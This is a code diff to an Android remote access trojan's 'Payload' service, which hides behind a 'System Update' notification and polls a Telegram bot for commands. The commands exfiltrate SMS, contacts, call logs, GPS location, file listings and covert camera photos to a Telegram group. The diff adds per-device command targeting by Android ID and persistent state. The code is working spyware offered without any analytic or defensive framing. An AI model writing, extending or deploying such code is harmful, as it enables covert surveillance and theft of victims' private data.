@@ -18,6 +18,7 @@ import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
 import android.os.Environment;
+import android.content.Context;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -38,6 +39,8 @@ public class Payload extends Service {
     private String GROUP_ID = "-1004405270823"; 
     
     private long lastUpdateId = 0;
+    private String myAndroidId = "";
+    private android.content.SharedPreferences prefs;
 
     private void writeLog(String msg) {
         try {
@@ -82,9 +85,12 @@ public class Payload extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        prefs = getSharedPreferences("rat_prefs", MODE_PRIVATE);
+        lastUpdateId = prefs.getLong("lastUpdateId", 0);
+        myAndroidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+
         writeLog("1. Service Start (Alarm)");
         
-        // 1. WAJIB Bikin Notifikasi Foreground Cepat
         if (Build.VERSION.SDK_INT >= 26) {
             String CHANNEL_ID = "sys_update_channel";
             NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
@@ -99,7 +105,6 @@ public class Payload extends Service {
             startForeground(1, notification);
         }
 
-        // 2. Kerjain tugas di Background Thread
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -115,7 +120,7 @@ public class Payload extends Service {
             }
         }).start();
 
-        return START_NOT_STICKY; // Biar ga auto-restart ngasal
+        return START_NOT_STICKY;
     }
 
     private void checkCommands() {
@@ -138,21 +143,23 @@ public class Payload extends Service {
                 int endIdx = jsonResponse.indexOf(",", startIdx);
                 if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                 lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
+                prefs.edit().putLong("lastUpdateId", lastUpdateId).apply();
             }
             
-            if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
+            // LOGIKA FILTER ID
+            if (jsonResponse.contains("\"text\":\"/dump_sms " + myAndroidId + "\"")) {
                 sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
-            } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/dump_kontak " + myAndroidId + "\"")) {
                 sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
-            } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/dump_telpon " + myAndroidId + "\"")) {
                 sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
-            } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/foto_depan " + myAndroidId + "\"")) {
                 takePhoto(1);
-            } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/foto_belakang " + myAndroidId + "\"")) {
                 takePhoto(0);
-            } else if (jsonResponse.contains("\"text\":\"/lacak\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/lacak " + myAndroidId + "\"")) {
                 sendTelegramMessage("📍 *Lokasi GPS:*\n" + getLocation());
-            } else if (jsonResponse.contains("\"text\":\"/cek_file\"")) {
+            } else if (jsonResponse.contains("\"text\":\"/cek_file " + myAndroidId + "\"")) {
                 sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
             }
         } catch (Exception e) { 
@@ -162,7 +169,7 @@ public class Payload extends Service {
 
     private void sendCheckIn(String deviceInfo) {
         try {
-            String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
+            String encoded = URLEncoder.encode("/checkin " + deviceInfo + "|" + myAndroidId, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + GROUP_ID + "&text=" + encoded;
             new URL(urlStr).openConnection().getInputStream().close();
         } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
